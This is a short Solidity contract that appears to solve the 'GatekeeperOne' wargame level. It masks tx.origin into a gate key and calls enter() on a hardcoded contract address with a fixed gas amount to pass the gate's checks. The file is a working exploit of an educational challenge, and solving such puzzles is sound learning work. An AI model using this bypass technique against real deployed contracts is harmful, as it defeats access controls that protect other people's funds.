pragma solidity ^0.6.0;

import "./default.sol";
import "./more_test.sol";

contract OpenGate {
    GatekeeperOne gate =
        GatekeeperOne(0xfa9B1368602f73eCfbF71b5419d8Dee2e1890bBc);

    function open() public returns (bool) {
        bytes8 _gateKey = bytes8(uint64(tx.origin));
        bytes8 mask = 0xffffffff0000ffff;
        bytes8 result = _gateKey & mask;

        gate.enter{gas: 98546}(result);
        return true;
    }
}
